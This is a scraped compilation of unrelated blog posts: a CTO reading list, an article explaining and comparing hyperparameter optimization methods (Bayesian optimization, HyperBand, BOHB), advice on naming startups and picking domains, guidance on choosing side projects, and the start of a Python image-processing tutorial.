<p>One of your most visible roles as a CTO is to solve challenging technical problems as your company grows. Once you’ve built your MVP and started to scale, you have to figure out how to maintain growth and deal with more data and users. In this section, I will include some books that help CTOs solve technical problems.</p>
<h3 id="the-architecture-of-open-source-applications"><a href="https://amzn.to/3nbXB47">The Architecture of Open-Source Applications</a></h3>
<p>I worked with many programmers throughout the years and noticed that many of them make the same mistakes over and over again. One of the best ways to avoid repeating the mistakes of the past is to learn about them. In this book, the authors of 25 well-known open-source applications talk about their software architecture and its evolution over time. It’s a fascinating deep dive into the minds of some brilliant people.</p>
<p>“The book is an excellent collection of architectural/structural sketches of major open-source projects. Many of them are written by the developers or maintainers of these projects and provide invaluable insight into why these projects are structured the way they are. The description of each project is an individual chapter and can be read in isolation.“</p>
<h3 id="how-to-make-sense-of-any-mess-information-architecture-for-everybody"><a href="https://amzn.to/35cMhi2">How to Make Sense of Any Mess: Information Architecture for Everybody</a></h3>
<p>Being a CTO, I often encounter problems that seem impossible. Sometimes, I’m not even sure where to start. However, Covert’s book helped me a lot by explaining how to properly break big problems into smaller chunks and solve them step-by-step.</p>
<p>“This is an essential read for knowledge workers because it is the essence of what knowledge workers do. We don’t all need to be IA professionals, but if you do something like engineering or computer programming, this book is part of the “soft skills” we all talk about.”</p>
<h3 id="clean-code-series-by-robert-martin"><a href="https://amzn.to/3eJapvP">Clean Code Series by Robert Martin</a></h3>
<p>Every year, companies spend many hours and even resources on fixing the poorly-written code. In this classic series, Martin explains the difference between good and bad code and provides a totally different view on making an efficient program.</p>
<p>“I’ve been programming for about 17 years and consider myself above average programmer. Yet, this book made me feel like I’m actually a horrible coder. I’ve always gotten my tasks done but I didn’t pay attention to refactoring to clean up the code. I’m already behind and got a demo coming up in a few days. As I’m reading my guilty verdicts on all his ‘bad code’ examples, it inspires me to care about ‘coding’ yet again. It can be fun, and it’s not all about getting the job done.”</p>
<p><em>Note: <a href="https://www.karllhughes.com/posts/five-takeaways-from-clean-code-a-handbook-of-agile-software-craftsmanship">I wrote a long review of Clean Code back in 2015</a>, but that review holds up.</em></p>
<h3 id="designing-data-intensive-applications-the-big-ideas-behind-reliable-scalable-and-maintainable-systems"><a href="https://amzn.to/3nbYjyj">Designing Data-Intensive Applications: The Big Ideas Behind Reliable, Scalable, and Maintainable Systems</a></h3>
<p>Every application becomes a data-intensive application if it grows large enough, and building these data-rich applications can be a very tricky job. In this book, Martin Kleppmann explains that although software keeps changing, the principles for handling data remain the same. He also talks about the architecture of well-known websites.</p>
<p>“If you are interested in distributed systems or scalability, this book is a must-read for you. It gives you a high-level understanding of different techniques, including the idea behind it, the pros and cons, and the problem it is trying to solve. A great book for practitioners who want to learn all the essential concepts quickly.”</p>
<h2 id="scaling-up">Scaling Up</h2>
<p>If you are already making some money but you’re <a href="https://www.karllhughes.com/posts/hiring-process">struggling to hire and build a large team</a>, the books in this section will help. These books talk about growing your business, raising money, and building a scalable team structure.</p>
<h3 id="startup-engineering-management"><a href="https://amzn.to/2IfMZ5g">Startup Engineering Management</a></h3>
<p>This book is a must-read for all engineers who are offered a management job at a startup - CTOs included. Being an engineer and manager himself, Piaw explains his process for putting together a team, hiring top-notch engineers, and picking engineering leaders. It’s a very tactical book for engineers and managers of all levels.</p>
<p>“This book is a short but practical guide for engineering team managers on how to run an effective team through different obstacles and problems that may arise in the real world when developing products in a fast-changing environment.”</p>

<p>If you want to learn about state-of-the-art hyperparameter optimization algorithms (HPO), in this article I’ll tell you what they are and how they work.</p>



<p>As an ML researcher I’ve read about and used state-of-the-art HPO algorithms quite a bit and in the next few sections I’m going to share with you what I’ve discovered so far.</p>



<p>Hope you like it!&nbsp;</p>








<h2 id="Approaches">A bit about HPO approaches</h2>



<p>HPO is a method that helps solve the challenge of tuning hyperparameters of machine learning algorithms.&nbsp;</p>



<p>Outstanding ML algorithms have multiple, distinct and complex hyperparameters that generate an enormous search space. Plenty of start-ups choose to use deep learning in the core of their pipelines, and search space in deep learning methods is even larger than traditional ML algorithms.&nbsp;Tuning on a massive search space is a tough challenge.</p>



<p>To solve HPO problems, we need to use data-driven methods. Manual methods are not effective.</p>



<p>Many approaches have been proposed to tackle the HPO problem:</p>



<div><figure><img loading="lazy" width="1024" height="513" src="https://i0.wp.com/neptune.ai/wp-content/uploads/HPO-2.png?resize=1024%2C513&amp;ssl=1" alt="HPO" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/HPO-2.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/neptune.ai/wp-content/uploads/HPO-2.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/HPO-2.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/neptune.ai/wp-content/uploads/HPO-2.png?resize=1536%2C770&amp;ssl=1 1536w, https://i0.wp.com/neptune.ai/wp-content/uploads/HPO-2.png?w=1600&amp;ssl=1 1600w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p><em>Image from <a href="https://arxiv.org/abs/1906.02287" target="_blank" rel="noreferrer noopener nofollow">Automated Machine Learning: State-of-The-Art and Open Challenges</a></em></p>



<p>We will discuss four main, most effective methods.</p>






<h2 id="Bayesian-Optimization">Bayesian Optimization&nbsp;</h2>



<p>To understand BO, we should know a bit about the Grid search and random search methods (explained nicely in <a href="https://www.jmlr.org/papers/volume13/bergstra12a/bergstra12a.pdf" target="_blank" rel="noreferrer noopener nofollow">this paper</a>). I’m just going to summarize these methods.&nbsp;</p>



<p>Let’s say that our search space consists of only two hyperparameters, one is significant and the other is unimportant. We want to tune them to improve the accuracy of the model. If each of them has 3 distinct values, the whole search space would be 9 possible choices. We could try each of them to find the best value for both hyperparameters.</p>

<p>But as you can see in the figure above, Grid search was unable to find the best value for the important hyperparameter. One solution for this may be to go through the search space at random, much like the figure below.</p>

<h3><strong>Why is Bayesian Optimization effective?</strong></h3>



<p>The Random search eventually converges to the optimal answer, but this method is just such a blind search! Is there a smarter way to search? Yes – Bayesian optimization, suggested by <a href="https://link.springer.com/chapter/10.1007%2F978-3-662-38527-2_55" target="_blank" rel="noreferrer noopener nofollow">J.Močkus</a>. You can find more information about BO in this <a href="https://static.sigopt.com/b/20a144d208ef255d3b981ce419667ec25d8412e2/static/pdf/SigOpt_Bayesian_Optimization_Primer.pdf" target="_blank" rel="noreferrer noopener nofollow">Bayesian Optimization Primer</a>, and in <a href="http://papers.nips.cc/paper/4522-practical-bayesian-optimization" target="_blank" rel="noreferrer noopener nofollow">Practical Bayesian Optimization of Machine Learning Algorithms</a>.</p>



<p>In essence, Bayesian optimization is a probability model that wants to learn an expensive objective function by learning based on previous observation. It has two powerful features: surrogate model, and acquisition function.&nbsp;</p>



<div><figure><img loading="lazy" src="https://i1.wp.com/neptune.ai/wp-content/uploads/hyperparameter-optimization.png?resize=512%2C498&amp;ssl=1" alt="hyperparameter optimization" width="512" height="498" srcset="https://i1.wp.com/neptune.ai/wp-content/uploads/hyperparameter-optimization.png?resize=1024%2C996&amp;ssl=1 1024w, https://i1.wp.com/neptune.ai/wp-content/uploads/hyperparameter-optimization.png?resize=300%2C292&amp;ssl=1 300w, https://i1.wp.com/neptune.ai/wp-content/uploads/hyperparameter-optimization.png?resize=768%2C747&amp;ssl=1 768w, https://i1.wp.com/neptune.ai/wp-content/uploads/hyperparameter-optimization.png?w=1388&amp;ssl=1 1388w" sizes="(max-width: 512px) 100vw, 512px" data-recalc-dims="1"></figure></div>



<p><em>Image from the <a href="https://link.springer.com/chapter/10.1007/978-3-030-05318-5_1" target="_blank" rel="noreferrer noopener nofollow">Hyperparameter Optimization</a> chapter of the AutoML book by Matthias Feurer, Frank Hutter</em></p>



<p>In the figure above, you can see a nice explanation for Bayesian optimization based on the Hyperparameter Optimization chapter in <a href="https://link.springer.com/chapter/10.1007/978-3-030-05318-5_1" target="_blank" rel="noreferrer noopener nofollow">Automated Machine Learning</a>. In this figure, we want to find the true objective function which is shown as a dashed line. Imagine we have one continuous hyperparameter, and in the second iteration we observed two black points, then we fitted a surrogate model (regression model) that is the black line. The blue tube around the black line is our uncertainty.&nbsp;</p>



<p>We also have an acquisition function, which is the way we explore the search space for finding the new observation optimum value. In other words, the acquisition function helps us improve our surrogate model and select the next value. In the image above, the acquisition function is shown as an orange curve. An acquisition max means where the uncertainty is max and predicted value is low.</p>






<h3><strong>Pros and cons of Bayesian Optimization</strong></h3>



<p>The most important advantage for bayesian optimization is that it can operate very well with black box function. BO is also data efficient and robust with noise. But it can’t work well with parallel resources duo, because&nbsp;the optimization process is sequential.</p>

<h2 id="Algorithms">Multi Fidelity Optimization</h2>



<p>In the Bayesian method, estimation of the objective function is very expensive. Is there any cheaper way to estimate the objective function? Multi Fidelity optimization methods are the answer. I’ll tell you about:</p>



<ol><li>Successive halving</li><li>HyperBand</li><li>BOHB</li></ol>



<p>As an extra resource, in the following video Andreas Mueller explained multi fidelity optimization methods very nicely.</p>



<figure><p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/tqtTHRwa8dE?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>

<h2>Successive halving</h2>



<p>Successive halving tries to give the most budget to the most promising methods. It assumes all configuration could be stopped early and validation score could be obtained.&nbsp;</p>



<p>Imagine you have N different configurations and ß budget (for example time). In each iteration, as you can see in the below image, successive halving keeps the best halve of the configurations and discards half of the algorithms that are not good. It will continue until we have just one single configuration. This method will be finished when it reaches the maximum of its budget.</p>

<p><em>Figure from <a href="https://www.automl.org/blog-2nd-automl-challenge/" target="_blank" rel="noreferrer noopener nofollow">automl.org</a></em></p>



<p>Successive halving was originally proposed in <a href="http://proceedings.mlr.press/v51/jamieson16.pdf" target="_blank" rel="noreferrer noopener nofollow">Non-stochastic Best Arm Identification and Hyperparameter Optimization</a>, written by Kevin Jamieson and&nbsp;Ameet Talwalkar.</p>



<h3><strong>What is the problem with successive halving?</strong></h3>



<p>In successive halving there is a trade-off between how many configurations we need to select at start and how many cuts we need. In the next section you’ll see how Hyperband solves this issue.</p>






<h2>HyperBand&nbsp;</h2>



<p>This method is an extension on top of successive halving algorithms, suggested as <a href="https://arxiv.org/abs/1603.06560" target="_blank" rel="noreferrer noopener nofollow">A Novel Bandit-Based Approach to Hyperparameter Optimization</a> by Lisha Li and others.&nbsp;</p>



<p>I mentioned that the successive halving method suffers from a trade off between selecting the number configurations and allocating the budget. To solve this problem, HyperBand proposed to frequently perform the successive halving method with different budgets to find the best configurations. In the below figure you can see HyperBand has better performance in comparison with random search.</p>

<h2>BOHB</h2>



<p>BOHB is a state-of-the-art hyperparameter optimization algorithm, proposed in <a href="https://arxiv.org/abs/1807.01774" target="_blank" rel="noreferrer noopener nofollow">BOHB: Robust and Efficient Hyperparameter Optimization at Scale</a>, written by Stefan Falkner, Aaron Klein, and Frank Hutter. The idea behind the BOHB algorithm is based on one simple question – why do we run successive halving repeatedly?&nbsp;</p>



<p>Instead of a blind repetition method on top of successive halving, BOHB uses the Bayesian Optimization algorithm. In fact, BOHB combines HyperBand and BO to use both of these algorithms in an efficient way. Dan Ryan explains the BOHB method in his presentation perfectly. <a href="https://youtu.be/IqQT8se9ofQ" target="_blank" rel="noreferrer noopener nofollow">Add it to your watch list</a>.</p>



<figure><p><span><iframe width="640" height="360" src="https://www.youtube.com/embed/IqQT8se9ofQ?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en-US&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span>

<p><em>A great <a href="https://youtu.be/IqQT8se9ofQ" target="_blank" rel="noreferrer noopener nofollow">presentation</a> by Dan Ryan about Efficient and Flexible Hyperparameter Optimization on PyData Miami 2019</em></p>



<p>BOHB is a multi fidelity optimization method, and these methods depend on budget, so finding a consequential budget is important. On the other hand, BOHB is robust, flexible, and scalable. If you need more detailed info, you may want to check the official <a href="https://www.automl.org/blog_bohb/" target="_blank" rel="noreferrer noopener nofollow">blog post</a> about BOHB by André Biedenkapp and Frank Hutter.</p>



<p>In addition, <a href="https://github.com/automl/HpBandSter" target="_blank" rel="noreferrer noopener nofollow">HpBandSter</a> is a nice implementation of BOHB and HyperBand. You can find its documentation <a href="https://automl.github.io/HpBandSter/build/html/optimizers/bohb.html">here</a>.</p>






<h2 id="Comparison">Random Search vs HyperBand vs BOHB + Results comparison in Neptune</h2>



<p>Now that we know the descriptions and are familiar with the methods, let’s use <a href="https://ui.neptune.ai/mjbahmani/HyperBand-BOHB" target="_blank" rel="noreferrer noopener nofollow">Neptune</a> to make some experiments and comparisons based on these methods.</p>



<p>If you want to follow along with me:</p>



<ul><li>Install <a href="https://github.com/automl/HpBandSter" target="_blank" rel="noreferrer noopener nofollow">HpBandSter</a> on your machine</li><li>Use the example from <a href="https://automl.github.io/HpBandSter/build/html/auto_examples/example_5_mnist.html" target="_blank" rel="noreferrer noopener nofollow">this link</a>.</li><li>Set your configuration budget.</li><li>Do the same experiment for each optimizer.</li><li><a href="https://docs.neptune.ai/index.html" target="_blank" rel="noreferrer noopener nofollow">Track the experiments with Neptune.</a></li></ul>



<p>Since I decided to do the experiment on an equal basis, I used <a href="https://github.com/automl/HpBandSter" target="_blank" rel="noreferrer noopener nofollow">HpBandSter</a> which has an implementation for BOHB, with HyperBand and RandomSearch as an optimizer. An official example can be found <a href="https://automl.github.io/HpBandSter/build/html/auto_examples/example_5_mnist.html" target="_blank" rel="noreferrer noopener nofollow">here</a>. Based on this example, we have a small CNN in Pytorch which will be tuned for the <a href="https://en.wikipedia.org/wiki/MNIST_database" target="_blank" rel="noreferrer noopener nofollow">MNIST</a> dataset. I ran this example based on three different optimizers:</p>



<ol><li>BOHB&nbsp;</li><li>HyperBand&nbsp;</li><li>RandomSearch.&nbsp;</li></ol>



<p>For each optimizer I used the following budgets:</p>




<table>
<thead>
  <tr>
    <th>Configurations</th>
    <th>Range value</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Min budget</td>
    <td>[1]</td>
  </tr>
  <tr>
    <td>Max budget</td>
    <td>[1,2,3,4,5]</td>
  </tr>
  <tr>
    <td>Number of iteration</td>
    <td>[1,2,3,4,8,10]</td>
  </tr>
</tbody>
</table>






<p>It means that we have run different combinations, at least 26 experiments to examine the capabilities of optimizers (BOHB, Hyperband, Random Search). In addition, through this example we want to find the best configuration for CNN based on the following hyperparameters.</p>




<table>
<thead>
  <tr>
    <th>Parameter name</th>
    <th>Range</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Learning rate</td>
    <td>[1e-6, 1e-2]</td>
  </tr>
  <tr>
    <td>Number of conv layers</td>
    <td>[1,3]</td>
  </tr>
  <tr>
    <td>Number of filters in the first conf layer</td>
    <td>[4, 64]</td>
  </tr>
  <tr>
    <td>Dropout rate</td>
    <td>[0, 0.9]</td>
  </tr>
  <tr>
    <td>Number of hidden units in fully connected layer</td>
    <td>[8,256]</td>
  </tr>
</tbody>
</table>

<p>After running these experiments with various configurations in Neptune, I got some insightful results.</p>

<p>Here you can see a nice contrast between those optimizers for n_iteration=3 and max_budget=3. I find that if I increase the number of iterations, all optimizers finally get best performance, but when the budget is significant, BOHB could do it better.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Even the best founding teams in the world have a lot of trouble deciding on a name for their startup.</p><p>While he admits that finding the right name probably isn’t going to mean the difference between failure and success, even Patrick Collison struggled to find the right name. They started out with the name slashdevslashfinance! When they had to celebrate the times someone <em>correctly</em> pronounced their name, they realized that they would need to find a better one. They resorted to methods like turning to random pages in books and writing a script to run through potential names and check if the domain was available. Stripe happened to be on that list and was on sale for under $20,000.</p><p><img src="https://atay.me/images/stripe.jpg" alt="img"></p><p>That was in 2012. It’s gotten even harder. Since then, all 4-letter and the vast majority (if not all) of dictionary word domains are already taken. Chances are your top choices for names are either taken by a company doing something similar, well established by someone else, or too expensive. That means you’re going to have to gather all your creative juices in order the think of something different.</p><p>Does it matter? Yes. Finding the right name <em>does</em> matter. In a world where there may already be dozens of companies or projects competing for the same customers, the right name can help yours be more memorable. It’s the first thing they hear about your startup and whether you like it or not, the sound of the name invokes some sort of feeling. Whether those feelings are good or bad is up to you.</p><h2 id="what-to-look-for-in-a-name">What to look for in a name</h2><p>When I look for a name, I make sure it follows the following rules (with a bit of bending):</p><p>The name <strong>must</strong> be simple.</p><p>The name <strong>must</strong> be short. Anything more than 8-10 letters is pushing it.</p><p>The name <strong>must</strong> pass the phone test. If you were to call up a friend and tell them to go to ________.com and they ask how it’s spelled, it has failed the test.</p><p>The name <strong>should</strong> be unexpected/fun.</p><p>The name should be <strong>somewhat</strong> descriptive of what you do, but this isn’t a requirement.</p><p>And finally, you <strong>should</strong> have a great domain name. We’ll get to this soon.</p><p>That’s a lot for one name to live up to! It’s a daunting task but it is important.</p><p>I start by writing down all the single words that could be the name of the startup, or are related to what the startup does. They can be long or short, available or taken. It doesn’t matter at this stage. Just get them down.</p><p>Then, start combining them to try to form something that sounds good using a spreadsheet or a site that does it for you.</p><p>One thing I try to notice is when words can be merged. For example, if you have a word on your list ending in -me and a word starting me- that could be complimentary, try putting them together. However, this often breaks the phone test rule.</p><p>There are some other tools I use that lead me in the right direction.</p><p><a href="https://thesaurus.com/">Thesaurus</a> - Pretty self explanatory. Enter a word and get words with a similar meaning. Add interesting ones to your master list.</p><p><a href="https://rhymezone.com/">RhymeZone</a> - Some people aren’t fans of names that have two parts that rhyme, but I think it helps people remember them.</p><p><a href="https://leandomainsearch.com/">Lean Domain Search</a> - What I really like about this site is that its a name finder and domain checker in one. You enter a word, and it suggests domains with your word plus another, either at the beginning or end. You can also search by length which is helpful in getting short names.</p><p><a href="https://morewords.com/">More Words</a> - The particular pages I like are <a href="https://www.morewords.com/words-that-start-with/cat">words that start with</a>, <a href="https://www.morewords.com/end-with/cat">words that end with</a>, and <a href="https://www.morewords.com/contains/cat">words that contain</a>. For example, if you were starting a cat walking service, you would search for words starting in “cat”. Catwalk comes up. Too literal probably. But you get the point.</p><p><a href="https://en.wikipedia.org/wiki/List_of_culinary_herbs_and_spices">Wikipedia</a> - I’ll often look through lists of things like foods, spices, animals, plants depending on the product.</p><p><a href="https://randomwordgenerator.com/">Random Word Generator</a> - This one is a bit of a long shot, but there are tens of thousands of English words and sometimes we forget some. Remember to look in nouns <em>and</em> adjectives.</p><p><strong>Google Searches</strong></p><p>phrases related/containing to “______”</p><p>There are also websites that spit out name possibilities, but I don’t think naming startups is going to be taken over by an algorithm anytime soon. It’s just too nuanced. Would an algorithm have come up with the name Twitter? Unlikely.</p><h2 id="domains">Domains</h2><p>If just coming up with a name for your startup wasn’t hard enough, finding a proper domain name can be even harder. Now, the name itself is more important than the domain name, so you can make some sacrifices on the domain name.</p><p>Chances are you can’t afford your dream domain name right now, and that’s ok. There are some ways you can get around it until you can afford it (at which time, if you’re successful, it will be very expensive).</p><p>For example, when Buffer was created, they called their app/company Buffer but settled for bfffr.com (definitely not ideal) and then moved to bufferapp.com (better) until they were finally able to secure buffer.com.</p><p>Lots of other successful companies have done this as well, including Facebook and Twitter. Twitter absolutely nailed the name and it’s one of the reasons they’re so successful.</p><p>Some of the best advice about this issue is from Marc Köhlbrugge. I return to this time and again whenever I’m naming a project:</p><blockquote>— Marc Köhlbrugge (@marckohlbrugge) <a href="https://twitter.com/marckohlbrugge/status/1147061790498598914?ref_src=twsrc%5Etfw">July 5, 2019</a></blockquote><p>His advice is that you can only have two parts of your domain that need to be remembered. (Ideally just one):</p><p>Either</p><ul><li>a dictionary word + Non-standard TLD like .co .io or .app</li><li>a dictionary word + prefix/suffix + .COM</li></ul><p>Since the name itself is more important, you can try adding a prefix or suffix onto the name to get a domain.</p><p>For example:</p><h5 id="experiment-with-prefixes">Experiment with prefixes</h5><p>get-</p><p>use-</p><p>hello-</p><p>hi-</p><p>meet-</p><h5 id="experiment-with-suffixes">Experiment with Suffixes</h5><p>-app</p><p>-ly</p><p>-list</p><p>-hq</p><h2 id="tlds">TLDs</h2><p>In my opinion, .com is still king. If you can grab one of these for a name you like, that’s probably your winner. If not and you’re a tech company catering to a techie audience, .co, .io, or .app can do. Anything else I would try to stay away from.</p><p>Does it matter? <a href="https://moz.com/learn/seo/domain">According to Moz</a> it does. That’s all the authority you need on the topic.</p><p>As for how I’ve used some of these methods and guidelines? Here are some of the names I’ve come up with for my side projects and startups:</p><p><strong>CoVisitor</strong> -
An app that helps store owners keep track of their visitors during COVID-19</p><p><strong>TasteJury</strong> -
A site that lets people collectively decide on the best place to get certain dishes in a city.</p><p><strong>Open Sukkah</strong> -
“Airbnb for Sukkahs” - lets people open their sukkahs to people who want to use them.</p><p><strong>WhatsDue</strong>
A task management app for teachers, students, and parents</p><hr><p>Need help naming your startup or side project? Shoot me an email and I’m happy to brainstorm with you.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://iuliangulea.com/images/how-to-choose-project-cover.png" alt="Cover image"></p><blockquote><p>One finalized side project is better than three abandoned ones.</p></blockquote><p>This is the premise of the article you are about to read. A finalized, working project can be placed on your resume, be showcased to other people, offer you more learning opportunities, and potentially become your income source in the future.</p><p>An abandoned project is a little bit of learning and a plus one to the number of your abandoned projects.</p><p>If you disagree with the above, then you can simply close this article and move on.</p><p>If you agree, here’s a related comic.</p><p><img src="https://www.commitstrip.com/wp-content/uploads/2014/11/Strip-Side-project-650-finalenglish.jpg#c" alt="Side Project Comic"></p><p>I think we’ve all been in those shoes and have our own skeletons in the closet.</p><p>I have been programming for over 11 years and have started many pet projects, but only a few of them saw the light of the day (or rather the eyes of the users).</p><p>Choosing a project idea is a task that depends on many factors like your level of experience, domain of activity, tech stack, your interests, your goals, etc., so do not expect to learn the best idea ever for your next project in this article.</p><p>What you can expect is to learn some generally applicable principles that will help you make a better choice.</p><h2 id="how-do-people-learn">How Do People Learn?</h2><p>Let’s briefly discuss about <a href="https://iuliangulea.com/brain-basics/">how people learn</a> first. Whenever you read a book, watch a tutorial, or practice a skill, neurons in our brain fire together, forming complex neural circuits. It is these circuits that store the knowledge and skills we possess.</p><p>Moreover, our memory is associative, meaning that subsets of neural patterns are parts of many circuits. That explains how you can end up thinking about totally unrelated things to what you are currently doing. Some words might trigger a memory, which triggers another memory, and so on.</p><p>For instance, think of the last time you went to the seaside. Then think about what was the most memorable moment during that trip. Finally, think about something related to that unforgettable moment. This is how you hop around memories.</p><p>This also hints toward a more efficient approach toward learning new things: it is easier to “reuse” existing circuits rather than create new ones.</p><p>Consider these two explanations of what a computer program is:</p><blockquote><p>A computer program is a collection of instructions organized in functions, classes, modules, and libraries that perform a specific task.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p></blockquote><blockquote><p>A computer program consists of code that is grouped into entities called functions, classes, modules, and libraries. Like a lego, you can build a program to perform a specific task by combining various pieces together.</p></blockquote><p>The first is generic and very abstract, and it doesn’t consider any pre-existing knowledge in the listener’s mind. The second one makes an analogy and is easier to process since you can tap into your existing knowledge about what lego is and how it works.</p><p>Another crucial thing to learning is pre-requisite knowledge. You cannot build a roof without building the walls of a house. Although this sounds obvious, sometimes you might get too enthusiastic about a potential project, but because you don’t understand the fundamentals, you won’t be able to realize your idea.</p><h2 id="build-on-the-current-state-of-your-knowledge">Build On The Current State Of Your Knowledge</h2><p>Your next project should be based on some of your existing knowledge upon which you can learn new things. This might sound self-evident, but sometimes we simply skip the analysis phase and jump right into the development phase.</p><p>The amount of all knowledge required to build a project should overlap with your existing experience. Otherwise, learning will be inefficient.</p><p>You might want to take on a project that will teach you <strong>lots</strong> of new concepts, but bear in mind that creating new neural pathways takes time and energy. Keep in mind that there is no fast way to do that, so if you want to be efficient at it, you have to take the slow route.</p><p><img src="https://iuliangulea.com/images/how-to-choose-project-venn-diagram.png" alt="Three types of projects as Venn diagrams"></p><p>There is a blurry line between efficient and inefficient projects from a learning standpoint:</p><ul><li>Choose a project that is too easy for you, and your learning will be minimal. Also, you might become bored along the way, not even finalizing it.</li><li>Choose a project that is too complex, and you will become frustrated and overwhelmed with the amount of information you need to learn and apply, which will increase the chances that you might as well abandon it.</li></ul><p>Finally, to shape up and structure the knowledge you already have, it helps to think about it through the prism of the <a href="https://iuliangulea.com/pyramid-of-mastery/">Pyramid of Mastery</a>.</p><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery/the-pyramid-of-mastery-1.png" alt="The Pyramid Of Mastery"></p><p>The Pyramid of Mastery allows you to define a domain in terms of four layers: Elements (main concepts and building blocks), Rules (both how Elements operate and general Rules within the domain), Tools, and Frameworks.</p><p>With this in mind, let’s discuss some strategies that can help you choose your next pet project are.</p><h2 id="3-aspects-to-help-you-choose-your-next-side-project">3 Aspects To Help You Choose Your Next Side Project</h2><p>Below you can find general guidelines that will help you make the right decision regarding your next project.</p><h3 id="1-focus-on-a-single-layer-from-the-pyramid-of-mastery">1. Focus On A Single Layer From The Pyramid Of Mastery</h3><p>This is a guiding principle I follow whenever I choose to do a personal project: narrow down the scope of the type of knowledge you want to gain.</p><p>Do not mix up new Elements, Rules, Tools, and Frameworks together. Ideally, focus on a single layer and choose a project that will help you gain expertise in that specific area. If that is not possible, do not go more than two layers.</p><p>This is a common mistake that beginners make. They want to learn as much as possible from a single project. But quite often, those expectations are unrealistic. If you want to learn a framework, in a new programming language, using principles that you haven’t used before (e.g., <a href="https://en.wikipedia.org/wiki/Asynchrony_(computer_programming)">asynchronous programming</a>, <a href="https://en.wikipedia.org/wiki/Design_Patterns">design patterns</a>, etc.), you are going to be overwhelmed with so much new information, that you won’t be able to process it and learn anything at all.</p><p>On many occasions, I made this mistake myself, and each time I had to review my project choice and start over with more realistic expectations and a narrower learning scope.</p><p>Therefore, if you want to start a project to learn new programming concepts, make it in the language you know best. If you’re going to build a project to learn a new programming language, do not throw in new Elements and Rules — focus on what you already know. Likewise, if you want to learn a new framework, make sure you are familiar with most of the Elements, Rules, and Tools it consists of.</p><p>This is also why it is not advisable to start learning programming with a Framework — you will get overwhelmed very fast by the vast amount of information on different Elements, programming Rules, programming language Rules, framework Rules, various Tools, etc. if you do not already know them.</p><h3 id="2-choose-a-project-of-an-appropriate-size">2. Choose A Project Of An Appropriate Size</h3><p>You might want to build the next Facebook, but sometimes you should focus on building a simple function or class first. This is a bit exaggerated, but as a general rule, your projects' scope should increase once you get more experience in your field.</p><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery-swe/scale-of-impact.png#c" alt="Image with line chart"></p><p>Initially, focus on smaller projects with limited scope. When you start learning something, the amount of information you have to process is enormous. Since our <a href="https://iuliangulea.com/working-memory/">working memory</a> has a very limited capacity, keep the tasks small to not overwhelm it.</p><p>Once you have a solid foundation and understanding of the essential Elements and Rules, you can start working on slightly bigger projects. It is very similar to construction.</p><p>In construction, you cannot raise the walls of a brick house in a day. There is a certain recommended height to which you can grow the walls — around 4–5 feet<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. Once you reach that, you have to let the cement solidify, as otherwise, the wall can tilt and collapse.</p><p><strong>Pro Tip:</strong> the scope size is also a better indicator than years of experience of a software engineer’s seniority level. You can have 5 years of experience, but if you work on individual modules and do not participate in bigger architectural decisions, you are a mid-level developer.</p><h3 id="3-choose-something-that-will-motivate-you">3. Choose Something That Will Motivate You</h3><p>Another aspect of project selection is the motivation you have to build it. If you are working on something you are excited about, chances are higher that you will actually finalize it and learn from it.</p><p>Even small projects can be challenging and exciting to build — you just need to put some thought into what you would like to create, depending on what you would like to learn.</p><p>There are several approaches to it that I find helpful:</p><p><strong>1. Think about what actions you are repeatedly performing that you could automate.</strong> It can be a small thing, like <em>writing a function that would erase the contents of your computer’s Trash Bin and then automate it to execute once a week.</em></p><p><strong>2. Think about what would be useful to you once in a while.</strong> Even if there might be dozens of existing services out there that offer it. For instance, <em>write a command-line interface (cli) to which you are providing a path, and it doubles down the sizes of all the images it finds in that path, thus saving disk space.</em></p><p><strong>3. Think about what features you like in some products/services, and build them from scratch.</strong> Here, the options are countless. Just pick your favorite service and try to reproduce a small part of it.</p><p><strong>4. Think about a problem you have that you would like to resolve.</strong> This resonates with point 1 from above, but on a bigger scale. And this is also the entry point to the realm of entrepreneurs and doers. Many people have started their companies simply because they didn’t like the current state of the services and products they have used.</p><p>And then there’s always the option to google a list of project ideas and pick one, but you can do better than that.</p><p>Remember that the goal to follow when selecting a project is to learn something new while also improving your work/life/leisure/etc. This will keep fueling your motivation and help you go through it till the end.</p><h2 id="conclusion">Conclusion</h2><p>Successful learning projects are much more than just an idea. However, a good idea is the first step that you need to have to build a project.</p><p>To wrap up this guide, here are the strategies to keep in mind when choosing your next project:</p><ol><li>Decide on what you want to learn.

<p>Images define the world, each image has its own story, it contains a lot of crucial information that can be useful in many ways. This information can be obtained with the help of the technique known as <strong>Image Processing</strong>.</p>



<p>It is the core part of computer vision which plays a crucial role in many real-world examples like robotics, self-driving cars, and object detection. Image processing allows us to transform and manipulate thousands of images at a time and extract useful insights from them. It has a wide range of applications in almost every field.&nbsp;</p>



<p>Python is one of the widely used programming languages for this purpose. Its amazing libraries and tools help in achieving the task of image processing very efficiently.&nbsp;</p>



<p>Through this article, you will learn about classical algorithms, techniques, and tools to process the image and get the desired output.</p>



<p>Let’s get into it!</p>






<h2>What is image processing?</h2>



<p>As the name says, image processing means processing the image and this may include many different techniques until we reach our goal. </p>



<p>The final output can be either in the form of an image or a corresponding feature of that image. This can be used for further analysis and decision making.</p>



<p>But what is an image?</p>

